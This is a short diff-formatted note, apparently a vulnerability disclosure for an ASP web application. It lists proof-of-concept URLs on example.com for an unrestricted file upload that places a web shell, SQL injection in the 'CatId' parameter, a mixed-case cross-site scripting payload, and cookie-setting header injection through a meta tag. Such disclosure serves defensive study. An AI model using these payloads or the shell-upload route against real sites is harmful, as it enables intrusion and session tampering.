@@ -1,0 +1,13 @@
+For the file upload issue:
+http://www.example.com/upadmini/DEMO.asp
+Up to System
+shell uploaded in : http://www.example.com/upadmini/Uploads/[Name.asp]
+
+For the SQL-injection issue:
+http://www.example.com/main/default.asp?CatId=[SQL]
+
+For the cross-site scripting issue:
+http://www.example.com/main/default.asp?CatId=&lt;ScrIpT&gt;(&quot;Pouya_Server&quot;)&lt;/ScrIpT&gt;
+
+For the HTTP header injection issue:
+http://www.example.com/main/default.asp?CatId=&lt;meta+http-equiv=&#039;Set-cookie&#039;+content=&#039;cookiename=cookievalue&#039;&gt;
